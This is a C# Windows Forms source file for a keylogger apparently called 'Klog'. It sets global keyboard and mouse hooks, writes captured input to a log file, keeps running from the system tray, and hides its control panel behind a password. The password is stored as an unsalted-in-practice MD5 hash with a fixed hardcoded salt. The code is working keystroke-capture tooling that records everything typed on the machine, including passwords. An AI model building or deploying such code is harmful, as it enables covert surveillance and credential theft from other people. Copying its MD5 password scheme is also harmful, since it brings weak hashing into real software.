using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using gma.System.Windows;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Security.Cryptography;
using System.Security.Policy;
using Klog.Properties;

namespace Klog
{
    public partial class OptionsForm : Form
    {
        UserActivityHook _hook;

        public OptionsForm()
        {
            InitializeComponent();

            Directory.CreateDirectory(Path.GetDirectoryName(SimpleKeylogger.LogFileName));

            // Load UI settings
            cbKeybEnabled.Checked = Settings.Default.KeyboardLogEnabled;
            cbMouseEnabled.Checked = Settings.Default.MouseLogEnabled;

            InitializeKeylogger();
            StartHooks();
        }

        #region Hooks
        void InitializeKeylogger()
        {
            SimpleKeylogger logger = new SimpleKeylogger();

            _hook = new UserActivityHook(false, false);
            _hook.KeyPress += logger.OnKeyPress;
            _hook.KeyUp += logger.OnKeyUp;
            _hook.KeyDown += logger.OnKeyDown;
            _hook.OnMouseActivity += logger.OnMouseActivity;
        }

        void StartHooks()
        {
            if (cbMouseEnabled.Checked || cbKeybEnabled.Checked)
            {
                if (_hook != null)
                {
                    _hook.Start(cbMouseEnabled.Checked, cbKeybEnabled.Checked);
                }
                trayIcon.Icon = Resources.AppIcon;
            }
            else
            {
                trayIcon.Icon = Resources.DisabledIcon;
            }            
        }

        void StopHooks()
        {
            if (_hook != null) { _hook.Stop(true, true, false); }
            trayIcon.Icon = Resources.DisabledIcon;
        }
        #endregion


        private void OptionsForm_Activated(object sender, EventArgs e)
        {
            StopHooks(); 
        }

        private void OptionsForm_Deactivate(object sender, EventArgs e)
        {
            if (this.Disposing == false) { StartHooks(); }
        }

        private void bExit_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void OptionsForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
                Hide();
                return;
            }

            trayIcon.Visible = false; // hack around a Windows bug
        }

        private void bOpenLog_Click(object sender, EventArgs e)
        {
            Process.Start(SimpleKeylogger.LogFileName);
        }

        private void bOpenLogFolder_Click(object sender, EventArgs e)
        {
            Process.Start(Path.GetDirectoryName(SimpleKeylogger.LogFileName));
        }

        private void bDeleteLogs_Click(object sender, EventArgs e)
        {
            DirectoryInfo dir = new DirectoryInfo(Path.GetDirectoryName(SimpleKeylogger.LogFileName));
            dir.Delete(true);
            dir.Create();
        }

        #region Password handling

        public void VerifyPasswordShowControlPanel()
        {
            // Don't log our own password etc.
            StopHooks();

            // If the window is already active
            bool passVerified = false;
            if (Visible)
            {
                passVerified = true;
            }
            else if (String.IsNullOrEmpty(Settings.Default.PasswordHash))
            {
                passVerified = true;
            }
            else
            {
                PasswordBox pb = new PasswordBox();
                DialogResult dr = pb.ShowDialog();
                if (dr == DialogResult.OK)
                {
                    String pass = pb.Password;
                    String hash = ComputeHash(pass);
                    passVerified = (Settings.Default.PasswordHash == hash);
                    if (!passVerified)
                    {
                        MessageBox.Show("Invalid password.", "Error",
                            MessageBoxButtons.OK, MessageBoxIcon.Error);
                    }
                }
            }

            // Show the window and bring it to focus
            if (passVerified)
            {
                Show();
                Activate();
            }
            else
            {
                StartHooks();
            }
        }

        private void bChangePassword_Click(object sender, EventArgs e)
        {
            if (tbPass1.Text != tbPass2.Text)
            {
                MessageBox.Show("Passwords in two fields are not the same. Please enter again.", "Error", 
                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                tbPass1.SelectAll();
                tbPass1.Select();
                return;
            }

            // Save the password
            String hash = String.Empty;
            String pass = tbPass1.Text;
            if (!String.IsNullOrEmpty(pass))
            {
                hash = ComputeHash(pass);
            }

            Settings.Default.PasswordHash = hash;
            Settings.Default.Save();
            
            MessageBox.Show("Password changed.", "Success", 
                MessageBoxButtons.OK, MessageBoxIcon.Information);
        }

        private String ComputeHash(String plaintext)
        {
            // Salt
            plaintext += "slano";

            byte[] plainB = Encoding.UTF8.GetBytes(plaintext);
            HashAlgorithm hash = MD5.Create();
            byte[] hashB = hash.ComputeHash(plainB);

            StringBuilder sb = new StringBuilder();
            foreach (Byte b in hashB)
            {
                sb.AppendFormat(b.ToString("X2")); 
            }
            return sb.ToString();
        }

        #endregion

        private void OnUpdateUI(object sender, EventArgs e)
        {
            Settings.Default.KeyboardLogEnabled = cbKeybEnabled.Checked;
            Settings.Default.MouseLogEnabled = cbMouseEnabled.Checked;
            Settings.Default.Save();
        }

        private void bClose_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void trayIcon_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            VerifyPasswordShowControlPanel();
        }

        private void menuOpenControlPanel_Click(object sender, EventArgs e)
        {
            VerifyPasswordShowControlPanel();
        }


    }
}